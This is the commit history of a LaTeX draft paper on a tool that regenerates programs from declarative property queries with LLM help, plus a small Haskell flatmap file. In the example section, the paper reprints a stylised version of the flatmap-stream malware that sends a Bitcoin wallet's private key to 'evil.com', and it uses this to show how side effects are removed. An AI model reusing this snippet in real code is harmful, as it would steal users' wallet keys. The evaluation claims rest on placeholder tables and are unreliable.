### 2025-04-22 paper/draft.tex
add paper
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

\documentclass[sigplan,anonymous]{acmart}

\acmSubmissionID{PAPER ID}
\renewcommand\footnotetextcopyrightpermission[1]{}
\settopmatter{printfolios=true,printacmref=false}
\acmConference[Conference acronym 'XX]{Make sure to enter the correct
  conference title from your rights confirmation email}{June 03--05,
  2018}{Woodstock, NY}

\usepackage{setspace}
\usepackage{enumerate}
\usepackage{algorithm2e}
\usepackage{algpseudocode}
\usepackage{graphics}
\usepackage{xparse} 
\usepackage{xspace}
\usepackage{multirow}
\usepackage{csvsimple}
\usepackage{balance}
\usepackage{minted}
\usepackage{xcolor}
\usepackage{nicefrac}
\usepackage{siunitx}
\usepackage{array,framed}
\usepackage{booktabs}
\usepackage{
  color,
  float,
  epsfig,
  wrapfig,
  graphics,
  graphicx,
  subcaption
}
\usepackage{adjustbox}
\usepackage{csquotes}

\captionsetup{font=footnotesize,labelfont={bf, footnotesize}, belowskip=2pt}

\newcommand{\TODO}[1]{\hl{\textbf{TODO:} #1}\xspace}
\newcommand{\sys}{{\scshape TOOL}\xspace}
\newcommand{\rf}[1]{\ref{#1}}
\newcommand{\sx}[1]{(\S\ref{#1})}
\newcommand{\cf}[1]{(\emph{Cf}.\S\ref{#1})}
\newcommand{\se}[1]{\S\ref{#1}}
\newcommand{\fg}[1]{Fig.~\ref{#1}}
\newcommand{\heading}[1]{\vspace{2pt}\noindent\textbf{\emph{#1}}:\enspace}
\newcommand{\ttt}[1]{\mintinline[fontsize=\normalsize, breaklines, breakafter=-]{js}{#1}}

\begin{document}

\title{Submission ID}

\begin{abstract}
Test Abstract
\end{abstract}

\maketitle

\section{Introduction}

\bibliographystyle{ACM-Reference-Format}
\bibliography{bib.bib}

\end{document}

### 2025-05-22 paper/draft.tex
fix template
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>
improve example
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
-\documentclass[sigplan,anonymous]{acmart}
+\documentclass[sigplan]{acmart}
 
-\acmSubmissionID{PAPER ID}
+% \acmSubmissionID{PAPER ID}
 \renewcommand\footnotetextcopyrightpermission[1]{}
@@
 \usepackage{csquotes}
+\usepackage{cleveref}
 
 \captionsetup{font=footnotesize,labelfont={bf, footnotesize}, belowskip=2pt}
+\def\eg{{\em e.g.}, }
+\def\ie{{\em i.e.}, }
+\def\etc{{\em etc.}\xspace}
+\def\vs{{\em vs.}\xspace}
 
 \newcommand{\TODO}[1]{\hl{\textbf{TODO:} #1}\xspace}
-\newcommand{\sys}{{\scshape TOOL}\xspace}
+\newcommand{\sys}{{\scshape Sys}\xspace}
 \newcommand{\rf}[1]{\ref{#1}}
@@
 \newcommand{\heading}[1]{\vspace{2pt}\noindent\textbf{\emph{#1}}:\enspace}
-\newcommand{\ttt}[1]{\mintinline[fontsize=\normalsize, breaklines, breakafter=-]{js}{#1}}
+\newcommand{\ttt}[1]{\mintinline[fontsize=\normalsize, breaklines, breakafter=-, bgcolor=white]{javascript}{#1}}
+\newcommand{\xxx}{\colorbox{red}{xxx}\xspace}
 
@@
 
-\title{Submission ID}
+\title{\sys: Controllable Program Regeneration}
+\author{Evangelos Lamprou}
+
+% \sys is a framework for regenerating programs.
+% \sys accepts a variety of wanted program properties that should be preserved after regeneration.
+% \sys also takes a set of guiding properties that will be given as input to the regeneration component.
+% Then, \sys will regenerate the program to satisfy the wanted properties while preserving the guiding properties.
+% \sys can be used for source to source transformation, program repair, (original code can be: insecure, slow, proprietary, wrong, bad context, different language, non-idiomatic).
+% \sys uses a plugin architecture that allows extending it with program property extractors (IO pairs, CFG, AST, execution traces, execution time, etc.).
+% The regeneration component can be extended with different regeneration algorithms (e.g., genetic programming, symbolic execution, LLM, etc.).
+
+% Use cases for something like this include:
+% - program repair
+% - turning insecure code into secure code by removing side-effects
+% - transforming a program in language A to language B
+% - turning a program into a more idiomatic version of the same language
+% - having a program use a different API
+% - have a program be more amendable to parallelization
+% - have a program be more amendable to further analysis or transformation
 
 \begin{abstract}
-Test Abstract
 \end{abstract}
@@
 
+\section{Example}
+\sys enables users to specify transformation goals declaratively.
+These goals are expressed as logical constraints over properties of the
+regenerated program, such as input-output equivalence, side-effect elimination,
+target language, modular structure, and others.
+
+Given a program and a query over desired properties, \sys selects a minimal set
+of properties to extract from the original program, then attempts to synthesize
+a new program that satisfies the query.
+This process is cast as a
+minimum-satisfiability (MinSAT) problem, optimizing for the smallest extraction
+effort necessary to enable transformation.
+If the query is unsatisfiable under
+the available constraints or transformations, \sys issues an error
+message, showing the conflict.
+
+This section goes through an example applying \sys
+to five distinct program transformation tasks, 
+targeting security, language translation, compatibility,
+idiomaticity, and modularity.
+
+\heading{A compromised JavaScript library}
+The \texttt{flatmap-stream} library was implicated in a high-profile
+supply-chain attack that exfiltrated Bitcoin credentials.
+Although it preserved
+client-observable behavior, the library accessed the file system, network, and
+global state under specific conditions.
+Program regeneration can be used to automatically remove possible malicious payloads
+while preserving the original program's observable behavior,
+especially in this scenario, where the attack is highly obfuscated and 
+activates under very precise conditions.
+~\cite{harp:ccs:2021}.
+\begin{minted}[frame=lines]{js}
+module.exports = function (stream, fn) {
+  if (process.env.PRODUCTION) {
+    const priv = copay.getKeys()?.[0]?.priv;
+    if (priv && wallet.balance > 0) {
+      http.request({ hostname: 'evil.com' })
+          .end({ priv });
+    }}
+  return flatten(steam).apply(fn);
+};
+\end{minted}
+
+\begin{wrapfigure}[3]{r}{.5\columnwidth}
+\vspace{-10pt}
+\begin{minted}{prolog}
+equal(io(P), io(P_)).
+pure(P_).
+\end{minted}
+  % \begin{minted}{shell}
+% $ sys -i flatmap-stream.js -o flatmap-stream.js -q query.pl
+  % \end{minted}
+\end{wrapfigure}
+A program written in the \sys DSL to express this intent is shown on the right.
+This query requires the regenerated program \ttt{P_} to exhibit the same I/O behavior
+but forbids observable side effects.
+\sys first arrives at a minimal set of properties to extract from the
+original program, which will preserve the requested behavior, while increasing confidence that unwanted properties are retained.
+The \sys logic engine produces the set $\{\texttt{funcs(F, P), io(F), sig(F), pure(P)}\}$, where
+\texttt{funcs(F, P)} extracts the set of functions defined in the original program
+using a language-aware component that either parses the program source or extracts
+symbols from the binary.
+original program, \texttt{io(F)} extracts the I/O behavior of each function
+by providing its source code to an LLM instance and asking it to generate a set of
+inputs; corresponding outputs are then generated by executing the original program.
+\texttt{sig(F)} extracts each function's signature.
+The, \texttt{pure(P)} property means that \sys will confirm after regeneration that the original program is (apparently) pure
+using static analysis.
+
+After \xxx seconds, \sys generates the following program:
+\begin{minted}[frame=lines]{js}
+module.exports = function(stream, fn) {
+  return stream.map(fn); };
+\end{minted}
+
+\heading{Language translation}
+\sys takes advantage of the I/O intermediate representation to
+\texttt{flatmap-stream} into Haskell, while preserving its observable
+semantics.
+\begin{wrapfigure}[3]{r}{.5\columnwidth}
+\vspace{-10pt}
+\begin{minted}{prolog}
+equal(io(P), io(P_)).
+language(P_, haskell).
+\end{minted}
+\end{wrapfigure}
+The motivation may be integration into a Haskell-based pipeline or
+enabling formal verification.
+This transformation goal is expressed as the query shown on the right.
+Given this query, \sys again extracts I/O examples from the original program,
+then it transforms each eaxmple into an equivalent one in Haskell (\eg 
+the pair $\langle\texttt{([1,[2,3]], (x)=>x+1)}\to\texttt{[2,3,4]}\rangle$ 
+becomes $\langle(\texttt{[1, [2,3]], Js("(x)=>x+1"))}\to\texttt{[2,3,4]}\rangle$).
+Then, it provides the transformed examples to a new LLM instance, prompting it
+to generate a Haskell program that satisfies the same I/O behavior.
+\begin{minted}[]{haskell}
+flatMap :: (a -> b) -> [Either a [a]] -> [b]
+flatMap fn stream = concatMap fn stream
+\end{minted}
+The I/O examples are then again used to confirm the correctness of the
+regenerated program.
+
+\heading{An un-idiomatic C program}
+We begin with the classic fast inverse square root routine from the Quake III
+engine. 
+The original implementation exploits type punning to manipulate IEEE
+floats at the bit level---an optimization that relies on undefined behavior:
+
+\begin{minted}[]{c}
+float Q_rsqrt(float number) {
+ long i; float x2, y;
+ const float threehalfs = 1.5F;
+ x2 = number * 0.5F; y  = number;
+ i  = * ( long * ) &y; // evil bit level hack
+ i  = 0x5f3759df - ( i >> 1 );
+ y  = * ( float * ) &i;
+ y  = y * ( threehalfs - ( x2 * y * y ) );
+ return y;
+}
+\end{minted}
+
+The user provides the following query to \sys:
+\begin{wrapfigure}[3]{r}{.5\columnwidth}
+  \vspace{-10pt}
+  \begin{minted}{prolog}
+    equal(io(P), io(P_)).
+    #min len(P_).
+  \end{minted}
+\end{wrapfigure}
+\sys extracts only the I/O trace and basic arithmetic operations from the
+original implementation, and regenerates a new version that avoids undefined
+behavior.
+As a coarse metric of the produced code's idiomaticity, \sys uses the
+length of the generated program, which is minimized in the query.
+When instructed to optimize an aspect of the program, \sys will re-prompt
+the model to regenerate the program until either no further improvements are made after two consecutive iterations or
+the difference between two consecutive generations is below a user-defined threshold.
+After \xxx seconds, and \xxx iterations, \sys produces the following program:
+\begin{minted}[fontsize=\small]{c}
+#include <math.h>
+float Q_rsqrt(float number) {
+    return 1.0f / sqrtf(number);
+}
+\end{minted}
+The regenerated program is now idiomatic C code, lending itself 
+to higher portability, and easier analysis either by the compiler 
+or downstream tools.
+
+\heading{A rigid music database application}
+Consider a JavaScript application that retrieves and displays a user's music
+collection from an SQLite database:
+
+\begin{minted}[fontsize=\small]{js}
+// Original version: synchronous, monolithic
+function getAlbumsByArtist(artist) {
+  const db = new Database("music.db");
+  const rows = db.prepare("SELECT album FROM songs WHERE artist = ?").all(artist);
+  return rows.map(row => row.album);
+}
+\end{minted}
+We use \sys to produce a modular, asynchronous version compatible with modern
+JS environments and better separation of concerns:
+
+\begin{minted}[fontsize=\small]{js}
+// Regenerated: modular and async
+async function connectDB() {
+  const sqlite = require('sqlite');
+  return sqlite.open({ filename: 'music.db', driver: sqlite.Database });
+}
+
+async function getAlbumsByArtist(db, artist) {
+  const rows = await db.all("SELECT album FROM songs WHERE artist = ?", artist);
+  return rows.map(row => row.album);
+}
+\end{minted}
+The regenerated code is now more modular.
+
+% Snippets:
+
+% Q_rsqrt: security, idiomaticity, language-translation
+% Music Collection DB Access: compatibility, modularity
+
+\section{Evaluation}
+
+% benchmark summary table
+
+\begin{table}[h]
+\centering
+\caption{Summary of benchmarks used in the evaluation.}
+\begin{tabular}{llll}
+\toprule
+Benchmark                          & Description                 & Size & Source \\
+\midrule
+Rosetta Code                       & Programming tasks           &      & \\
+npm utilities                      & Utilities from npm          &      & \\
+Python utilities                   & Utilities from PyPi         &      & \\
+SSCA                               & Sneaky supply-chain attacks &      & \\
+IOCCC                              & Obfuscated C code           &      & \\
+Microbenchmarks                    & Custom microbenchmarks      &      & \\
+\hspace{.5em} \ttt{flatmap-stream} &                             &      & \\
+\hspace{.5em} \ttt{Q_rsqrt}        &                             &      & \\
+\hspace{.5em} \textsf{MusicDB}     &                             &      & \\
+\bottomrule
+\end{tabular}
+\label{tab:benchmarks}
+\end{table}
+
 \bibliographystyle{ACM-Reference-Format}

### 2025-05-22 paper/draft.tex
improvements to example
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

--- 2025-04-22 paper/draft.tex
@@
   color,
+  soul,
   float,
@@
 \usepackage{csquotes}
+\usepackage{cleveref}
+\usepackage{dirtytalk}
 
-\captionsetup{font=footnotesize,labelfont={bf, footnotesize}, belowskip=2pt}
+\def\eg{{\em e.g.}, }
+\def\ie{{\em i.e.}, }
+\def\etc{{\em etc.}\xspace}
+\def\vs{{\em vs.}\xspace}
 
-\newcommand{\TODO}[1]{\hl{\textbf{TODO:} #1}\xspace}
-\newcommand{\sys}{{\scshape TOOL}\xspace}
+\newcommand{\todo}[1]{\hl{\textbf{TODO:} #1}\xspace}
+\newcommand{\sys}{{\scshape Sys}\xspace}
 \newcommand{\rf}[1]{\ref{#1}}
@@
 \newcommand{\heading}[1]{\vspace{2pt}\noindent\textbf{\emph{#1}}:\enspace}
-\newcommand{\ttt}[1]{\mintinline[fontsize=\normalsize, breaklines, breakafter=-]{js}{#1}}
+\newcommand{\ttt}[1]{\mintinline[fontsize=\normalsize, breaklines, breakafter=-, bgcolor=white]{javascript}{#1}}
+\newcommand{\xxx}{\colorbox{red!30}{xxx}\xspace}
 
@@
 
-\title{Submission ID}
+\title{\sys: Controllable Program Regeneration}
+\author{Evangelos Lamprou}
+
+% \sys is a framework for regenerating programs.
+% \sys accepts a variety of wanted program properties that should be preserved after regeneration.
+% \sys also takes a set of guiding properties that will be given as input to the regeneration component.
+% Then, \sys will regenerate the program to satisfy the wanted properties while preserving the guiding properties.
+% \sys can be used for source to source transformation, program repair, (original code can be: insecure, slow, proprietary, wrong, bad context, different language, non-idiomatic).
+% \sys uses a plugin architecture that allows extending it with program property extractors (IO pairs, CFG, AST, execution traces, execution time, etc.).
+% The regeneration component can be extended with different regeneration algorithms (e.g., genetic programming, symbolic execution, LLM, etc.).
+
+% Use cases for something like this include:
+% - program repair
+% - turning insecure code into secure code by removing side-effects
+% - transforming a program in language A to language B
+% - turning a program into a more idiomatic version of the same language
+% - having a program use a different API
+% - have a program be more amendable to parallelization
+% - have a program be more amendable to further analysis or transformation
 
 \begin{abstract}
-Test Abstract
 \end{abstract}
+
+% Given a source program and a declarative user query $f(P, P')$,
+% \sys orchestrates a property-guided regeneration process.
+% Adapters extract relevant properties from the original program
+% using pluggable analyzers,
+% which may be language-agnostic (\eg I/O tracing)
+% or language-specific (\eg AST parsing),
+% and may require execution environments (\eg sandboxing).
+% The logic engine formulates a minimum-satisfiability (MinSAT) problem
+% over the property space using a plugin-extensible knowledge base that encodes
+% compatibility constraints (\eg which transformations preserve purity, which
+% properties can be reused across languages).
+% The synthesis engine uses these extracted properties to generate candidate
+% programs, which are verified by verifier plugins.
+% The result is a program $P'$ that satisfies the user’s transformation goal
+% while preserving required behaviors of the original program.
 
@@
 
+\section{Example}
+\label{sec:example}
+\begin{figure}[ht]
+  \includegraphics[width=\columnwidth]{figs/sys_overview-figure.pdf}
+  \caption{\textbf{\sys overview.}
+Given a transformation query, and a source program, \sys extracts a minimal set
+  of properties,
+  guided by a logic engine and knowledge base.
+  It then synthesizes a new program $P'$ that satisfies the query, verifying
+  that wanted properties are preserved and unwanted properties are avoided.
+  \todo{Make this a real figure.}
+}
+\end{figure}
+
+\sys enables users to specify transformation goals declaratively.
+These goals are expressed as logical constraints over properties of the
+regenerated program, such as input-output equivalence, side-effect elimination,
+target language, lines of code, and others.
+
+Given a program and a query over desired properties, \sys selects a minimal set
+of properties to extract from the original program, then attempts to synthesize
+a new program that satisfies the query.
+This process is cast as a
+minimum-satisfiability (MinSAT) problem~\cite{kohli1994minimum}, optimizing for the smallest extraction
+effort necessary to enable transformation.
+If the query is unsatisfiable under
+the constraints or transformations, \sys issues an error
+message, showing the conflict.
+
+This section goes through several examples applying \sys
+to three distinct program transformation tasks, 
+targeting security, language translation, compatibility,
+idiomaticity, and modularity.
+
+\heading{A compromised JavaScript library}
+The \texttt{flatmap-stream} library was implicated in a high-profile
+supply-chain attack that exfiltrated Bitcoin credentials~\cite{ev:eurosec:2022}.
+While it preserved
+client-observable behavior, the library accessed the filesystem, network, and
+global state under specific conditions.
+Program regeneration can be used to automatically remove possible malicious payloads
+while preserving the original program's observable behavior,
+especially in this scenario, where the attack is highly obfuscated and 
+activates under very precise conditions~\cite{harp:ccs:2021}.
+\begin{minted}[frame=lines]{js}
+module.exports = function (stream, fn) {
+ if (process.env.PRODUCTION) {
+  const priv = copay.getKeys()?.[0]?.priv;
+  if (priv && wallet.balance > 0) {
+    http.request({ hostname: 'evil.com' })
+        .send({ priv });
+  }} return flatten(steam).apply(fn); };
+\end{minted}
+
+\begin{wrapfigure}[3]{r}{.5\columnwidth}
+\vspace{-10pt}
+\begin{minted}{prolog}
+equal(io(P), io(P_)).
+pure(P_).
+\end{minted}
+\end{wrapfigure}
+A program written in the \sys DSL to express this intent is shown.
+This query requires the regenerated program \ttt{P_} to exhibit the same I/O behavior,
+but forbids side-effects.
+\sys first arrives at a minimal set of properties to extract from the
+original program, given its knowledge base and the query.
+This set is $\{\texttt{funcs(F, P), io(F), sig(F), pure(P)}\}$, where
+\texttt{funcs(F, P)} extracts the set of functions defined in the original program
+using a language-aware component that either parses the program source or extracts
+symbols from the binary,
+\texttt{io(F)} extracts the I/O behavior of each function
+by providing its source code to an LLM instance and asking it to generate a set of
+inputs; with corresponding outputs generated by executing the original program,
+and \texttt{sig(F)} extracts each function's signature.
+The, \texttt{pure(P)} property means that \sys will confirm after regeneration that the original program is (obviously) pure
+using static analysis.
+
+After \xxx seconds, \sys generates the following program:
+\begin{minted}[frame=lines]{js}
+module.exports = function(stream, fn) {
+  return stream.map(fn); };
+\end{minted}
+
+Building on the same source, \sys can be used for cross-language
+translation. 
+Here, the goal is to regenerate a semantically equivalent version
+of \texttt{flatmap-stream} in Haskell, to enable integration with a
+Haskell-based pipeline or facilitate formal reasoning.
+
+\begin{wrapfigure}[3]{r}{.5\columnwidth}
+\vspace{-10pt}
+\begin{minted}{prolog}
+equal(io(P), io(P_)).
+language(P_, haskell).
+\end{minted}
+\end{wrapfigure}
+The query requests preservation of I/O behavior and translation to Haskell. The
+logic engine deduces that extracting I/O traces and the function signature is
+sufficient; the knowledge base automatically associates the target language
+\texttt{Haskell} with purity.
+\sys transforms each extracted I/O example into an equivalent one in Haskell (\eg 
+the pair $\langle\texttt{([1,[2,3]], (x)=>x+1)}\to\texttt{[2,3,4]}\rangle$ 
+becomes $\langle(\texttt{[1, [2,3]], Js("(x)=>x+1"))}\to\texttt{[2,3,4]}\rangle$).
+Finally, it provides the transformed examples to a new LLM instance, prompting it
+to generate a Haskell program that satisfies the same I/O behavior.
+After \xxx seconds, having generated \xxx I/O pairs, \sys produces the following
+Haskell program:
+\begin{minted}[frame=lines]{haskell}
+flatMap :: (a -> b) -> [Either a [a]] -> [b]
+flatMap fn stream = concatMap fn stream
+\end{minted}
+
+\heading{An unidiomatic C program}
+The fast inverse square root routine from the Quake III
+engine~\cite{fast_inv_sqrt}
+is a classic example of performance-oriented low-level programming.
+The original implementation exploits type punning to manipulate IEEE
+floats at the bit level---an optimization that relies on undefined behavior:
+
+\begin{minted}[frame=lines]{c}
+float Q_rsqrt(float number) {
+ long i; float x2, y;
+ const float threehalfs = 1.5F;
+ x2 = number * 0.5F; y  = number;
+ i  = * ( long * ) &y; // evil bit level hack
+ i  = 0x5f3759df - ( i >> 1 );
+ y  = * ( float * ) &i;
+ y  = y * ( threehalfs - ( x2 * y * y ) );
+ return y;
+}
+\end{minted}
+
+The following query for \sys uses lines-of-code a coarse metric of idiomaticity.
+\sys will regenerate the program, minimizing this metric.
+\begin{wrapfigure}[3]{r}{.5\columnwidth}
+  \vspace{-10pt}
+  \begin{minted}{prolog}
+equal(io(P), io(P_)).
+#min len(P_).
+  \end{minted}
+\end{wrapfigure}
+\sys extracts the $\{\ttt{sig(F)}, \ttt{io(F)}\}$ properties from the original program, where \texttt{sig(F)} is the
+signature of the function (including its name, return type, and arguments), and \texttt{io(F)} is the I/O behavior of the function
+on a set of generated inputs.
+In this case, where it is instructed to optimize an aspect of the program, \sys will re-prompt
+the model to regenerate the program until no improvements are made or there is a negligible difference after two consecutive iterations.
+After \xxx seconds, and \xxx iterations, \sys produces the following program:
+\begin{minted}[frame=lines]{c}
+#include <math.h>
+float Q_rsqrt(float number) {
+    return 1.0f / sqrtf(number);
+}
+\end{minted}
+The regenerated version is easier to verify, portable across compilers, and
+avoids undefined behavior.
+A user could have also provided performance requirements using 
+the \ttt{time(P)} property to further guide the regeneration process.
+In this case, \sys would have run the two functions inside a tight loop and 
+would have aborted the regeneration process if the performance of the generated
+program was not within an acceptable user-defined threshold.
+
+\heading{A rigid music database application}
+Consider a JavaScript application that retrieves and displays a user's music
+collection from an SQLite database~\cite{codewithsadeemusicplayer, beets}:
+
+\begin{minted}[frame=lines]{js}
+function getAlbumsByArtist(artist) {
+  const db = new Database("music.db");
+  const rows = db.prepare("SELECT album
+  FROM songs WHERE artist = ?").all(artist);
+  return rows.map(row => row.album); }
+\end{minted}
+
+Having the database initialization being in the same function as 
+the database access has architectural and performance implications.
+In addition, there exist systems that can benefit from further decomposition
+of an application towards automatic distribution, parallelization or security~\cite{Towards_Modern_Ghemaw_2023, vasilakis2019ignis, vasilakis2018breakapp}.
+\begin{wrapfigure}[6]{r}{.7\columnwidth}
+  \vspace{-10pt}
+  \begin{minted}{prolog}
+db('music.db').
+equal(io(P), io(P_)).
+equal(trace(P,sql),trace(P_,sql)).
+func(F1). func(F2).
+equal(F2(F1, _), P).
+\end{minted}
+\end{wrapfigure}
+\sys, given the query to the right, is instructed 
+to generate program that consists of two functions,
+whose composition is equivalent to the original program, and feature 
+the same I/O and trace properties (a trace here being the sequence of SQL 
+queries transmitted to the database).
+\sys wraps the node process with monitors that extract the SQL queries 
+sent to the database for \xxx generated inputs.
+Then, after \xxx seconds and \xxx attempts, it arrives at two functions $f_1$, and 
+$f_2$, where their composition $f_2(f_1, \_)$, is equivalent to the original \ttt{getAlbumsByArtist} function across these inputs.
+A final processing step renames functions $f_1$ and $f_2$ by prompting an LLM instance.
+Alternatively, the user could have provided specific signatures and names for each 
+functions as an additional guiding property.
+The resulting program is:
+\begin{minted}[frame=lines]{js}
+function connectDB() {
+ const sqlite = require('sqlite');
+ return sqlite.open({filename: 'music.db'}); 
+}
+function getAlbumsByArtist(db, artist) {
+ const rows = await db.all("SELECT album
+ FROM songs WHERE artist = ?", artist);
+ return rows.map(row => row.album); }
+\end{minted}
+
+% \heading{Key Results}
+% \sys is able to effectively transform programs across a variety goals.
+
+\section{Component Interface}
+
+\sys adaptor, logic engine, and verifier components
+are designed to be extensible.
+These can be written in the form of plugins.
+Adding a new to-be-preserved (or avoided) property involves 
+creating a new adaptor function that extracts that property from the given 
+program together with the logical pre-conditions that need to hold 
+for it to be extractable, and a new verifier function that checks whether the
+property is preserved in the regenerated program or \say{unknown}.
+Each part of the plugin can produce logical atoms or rules which are fed to the \sys 
+logical engine and can influence the regeneration process.
+
+\section{Evaluation}
+
+We evaluate \sys along three axes:
+
+\begin{itemize}
+  \item[\textbf{Q1}] \textbf{Correctness and Regeneration Quality}: Does \sys preserve program behavior and produce high-quality programs?
+  \item[\textbf{Q2}] \textbf{Transformation Success}: Can \sys handle a diverse set of regeneration goals?
+  \item[\textbf{Q3}] \textbf{Planning Efficiency \& Precision}: Does minimizing extracted properties help regeneration succeed faster and more reliably?
+\end{itemize}
+
+\subsection{Benchmarks \& Methodology}
+
+We evaluate \sys on six benchmark suites, summarized in \cref{tab:benchmarks}.
+These benchmarks include popular codebases from real-world package ecosystems, obfuscated or malicious components, and handcrafted microbenchmarks that reflect the use cases discussed in \cref{sec:example}.
+
+\begin{table}[h]
+\centering
+  \caption{\textbf{Benchmark summary}. 
+  Benchmark programs have been sourced from several sources.
+  The $N$ column shows the number of programs/functions from each benchmar.
+  }
+\begin{tabular}{llrl}
+\toprule
+Benchmark                                               & Description                    & $N$ & Source \\
+\midrule
+  Rosetta Code                                          & Programming tasks              & 5 & \cite{rosettacode} \\
+  npm utilities                                           & Utilities from npm             & 20 & \cite{regbench2025} \\
+Python utilities                                        & Utilities from PyPi            & 20 & \cite{regbench2025} \\
+  SSCA                                                    & Sneaky SSAs    & 3 & \cite{ev:eurosec:2022, es1, ohm2020backstabber} \\
+  IOCCC                                                   & Obfuscated C code              & 2 & \cite{ioccc} \\
+Microbenchmarks                                         &          & 3    & This paper \\
+  \hspace{.5em} \ttt{flatmap-stream}                      & Secure regeneration            &      & \cite{es1}  \\
+  \hspace{.5em} \ttt{Q_rsqrt}                             & C refactoring        &      & \cite{fast_inv_sqrt}  \\
+  \hspace{.5em} \textsf{MusicDB}                          & Modularization           &      & \cite{codewithsadeemusicplayer} \\
+\bottomrule
+\end{tabular}
+\label{tab:benchmarks}
+\end{table}
+
+Each task consists of an input program, a \sys query expressing desired properties, and a test suite or functional oracle.
+
+\subsection{Q1: Correctness and Regeneration Quality}
+
+We evaluate correctness using developer-made test suites 
+shipped with the original software components as well as by manually inspecting
+the regenerated source code and report on correctness and the other query target metrics.
+When no test suite is available, we only do manual inspection.
+
+\begin{table}[h]
+  \centering
+  \caption{Correctness: Percentage of tasks passing all I/O tests.}
+  \begin{tabular}{lc}
+    \toprule
+    Benchmark & \sys Pass Rate \\ 
+    \midrule
+    Rosetta Code & \xxx/\xxx  \\
+    npm Utilities & \xxx/\xxx \\
+    Python Utilities & \xxx/\xxx \\
+    SSCA & \xxx/\xxx  \\
+    IOCCC & \xxx/\xxx  \\
+    Microbenchmarks & \xxx/\xxx  \\
+    \bottomrule
+  \end{tabular}
+\end{table}
+
+\subsection{Q2: Transformation Success}
+
+We test whether \sys meets transformation goals across different categories.
+Each row corresponds to a class of transformation query (e.g., removal of side effects, modular decomposition).
+We count success when the generated program meets all stated properties and passes correctness checks.
+\sys consistently succeeds at expressing non-trivial goals that GPT-4 baseline prompts often fail to satisfy.
+
+\subsection{Q3: Planning Efficiency \& Precision}
+
+To evaluate the impact of \sys's property planning, we compare it against a GPT-4 baseline that performs prompt-only rewriting without explicit access to guiding properties.
+
+We consider two criteria for each regenerated program:
+
+\begin{itemize}
+  \item \textbf{Wanted Property Satisfaction:} Does the output program satisfy all positive properties declared in the query (\eg \texttt{pure}, \texttt{language(haskell)})?
+  \item \textbf{Unwanted Property Avoidance:} Does the output avoid introducing disallowed behaviors (\eg side effects, global state, unsupported language features)?
+\end{itemize}
+
+\begin{table}[h]
+  \centering
+  \caption{
+    Planning precision: Number of tasks where positive properties are satisfied ($P_p$) and negative properties are avoided ($P_n$).
+  }
+  \begin{tabular}{lcc}
+    \toprule
+    Variant & $P_{p}$ & $P_{n}$  \\
+    \midrule
+    \sys & \xxx & \xxx \\
+    GPT-4 & \xxx & \xxx \\
+    \bottomrule
+  \end{tabular}
+\end{table}
+
+\sys consistently satisfies more of the declared properties while avoiding unintended behaviors.
+For instance, in the \texttt{flatmap-stream} benchmark, GPT-4 often preserved malicious side effects when the code appeared innocuous, whereas \sys generated provably pure rewrites by treating the source as untrusted and grounding regeneration in I/O behavior alone.
+
+\heading{Planning overhead}
+We measure the time taken by \sys's logic engine to select the minimal set of
+properties required to satisfy each query. 
+\begin{table}[h]
+  \centering
+  \caption{Planning overhead: time taken by \sys’s logic engine to compute minimal property set.}
+  \begin{tabular}{lcc}
+    \toprule
+    Benchmark & Properties Considered & $T_{\text{plan}}$ (ms) \\
+    \midrule
+    Rosetta Code & \xxx & \xxx \\
+    npm Utilities & \xxx & \xxx \\
+    Python Utilities & \xxx & \xxx \\
+    SSCA & \xxx & \xxx \\
+    Microbenchmarks & \xxx & \xxx \\
+    \bottomrule
+  \end{tabular}
+\end{table}
+
+Across all benchmarks, the planning step completes in under \xxx ms on average.
+% TODO: re-add this
+% adding negligible latency compared to synthesis time. Moreover, by minimizing
+% the number of properties to extract and verify, planning reduces the total time
+% and resource usage of the regeneration pipeline.
+
+These results support the claim that \sys’s planning logic — driven by explicit property extraction and knowledge-base reasoning — yields safer and more controllable transformations than prompt-only LLM-based systems.
+
 \bibliographystyle{ACM-Reference-Format}

### 2025-05-22 paper/draft.tex
small fix
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 
-The following query for \sys uses lines-of-code a coarse metric of idiomaticity.
-\sys will regenerate the program, minimizing this metric.
+The following query for \sys uses lines-of-code a coarse metric of
+idiomaticity. \sys will regenerate the program, minimizing this metric, while
+preserving its I/O behavior.
 \begin{wrapfigure}[3]{r}{.5\columnwidth}
-  \vspace{-10pt}
+  \vspace{-5pt}
   \begin{minted}{prolog}
@@
 \end{wrapfigure}
-\sys extracts the $\{\ttt{sig(F)}, \ttt{io(F)}\}$ properties from the original program, where \texttt{sig(F)} is the
+\sys extracts the set of properties $\{\texttt{sig(F)}, \texttt{io(F)}\}$ from the original program, where \texttt{sig(F)} is the
 signature of the function (including its name, return type, and arguments), and \texttt{io(F)} is the I/O behavior of the function
@@
 
-These results support the claim that \sys’s planning logic — driven by explicit property extraction and knowledge-base reasoning — yields safer and more controllable transformations than prompt-only LLM-based systems.
+These results support the claim that \sys’s planning logic---driven by explicit
+property extraction and knowledge-base reasoning---yields safer and more
+controllable transformations than prompt-only LLM-based systems.
 

### 2025-05-28 eval/flatmap.hs
add haskell flatmap
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -1,0 +1,20 @@
+-- Main.hs
+module Main where
+
+-- Define nested list
+data NestedList a
+  = Elem a
+  | List [NestedList a]
+  deriving (Show, Eq)
+
+-- | flatmap: flatten any depth of nesting and apply f to every element
+flatmap :: (a -> b) -> NestedList a -> [b]
+flatmap f (Elem x) = [f x]
+flatmap f (List x) = concatMap (flatmap f) x
+
+main :: IO ()
+main = do
+    let result1 = flatmap (+1) (Elem 5)
+    let result2 = flatmap (+1) (List [Elem 1, List [Elem 2, Elem 3], Elem 4])
+    print result1  -- Output: [6]
+    print result2  -- Output: [2,3,4]

### 2025-05-29 paper/draft.tex
small fixes
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>
fix flatmap hs code
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>
start introduction
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 % programs, which are verified by verifier plugins.
-% The result is a program $P'$ that satisfies the user’s transformation goal
+% The result is a program $P'$ that satisfies the user's transformation goal
 % while preserving required behaviors of the original program.
@@
 \section{Introduction}
+
+Modern software systems are in constant flux.
+Developers refactor legacy code,
+adapt libraries to evolving APIs, translate modules across programming
+languages, and harden components against emerging security threats.
+Each transformation demands a careful balance between preserving intended
